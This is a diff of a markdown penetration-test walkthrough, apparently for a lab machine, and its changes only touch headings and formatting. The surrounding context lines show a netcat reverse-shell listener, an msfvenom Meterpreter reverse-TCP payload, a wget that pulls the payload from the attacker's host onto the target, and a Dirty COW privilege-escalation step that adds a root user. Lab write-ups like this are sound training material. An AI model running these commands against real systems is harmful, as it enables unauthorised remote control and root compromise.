@@ -45,7 +45,7 @@ CGI Default !
 {: .prompt-info }
 
 ### reverse shell
-#### on attacker machine
+#### start listener on attacker machine
 ```bash
 $ nc -lvp 80
 listening on [any] 80 ...
@@ -74,8 +74,8 @@ www-data
 ---
 
 # post exploitation
-## deploy meterpreter
-### generate meterpreter payload
+## deploy `meterpreter`
+### generate `meterpreter` payload
 ```bash
 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.49.228 LPORT=443 -f elf > shell.elf
 ```
@@ -86,7 +86,7 @@ $ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-### upload to target
+### upload `meterpreter` to target
 ```bash
 www-data@ubuntu:/usr/lib/cgi-bin$ wget http://192.168.49.228/shell.elf -O /tmp/shell
 www-data@ubuntu:/usr/lib/cgi-bin$ chmod +x /tmp/shell
@@ -141,7 +141,7 @@ Server username: www-data
 ## privilege escalation
 1. Use [https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2) to identify that the server is vulnerable to `dirtycow`
 2. Use [https://www.exploit-db.com/raw/40839](https://www.exploit-db.com/raw/40839) and upload it to the target via `meterpreter`
-3. Compile and execute the exploit to add a new root user
+3. Compile and execute the exploit to add a new `root` user
 
 ```bash
 meterpreter > shell
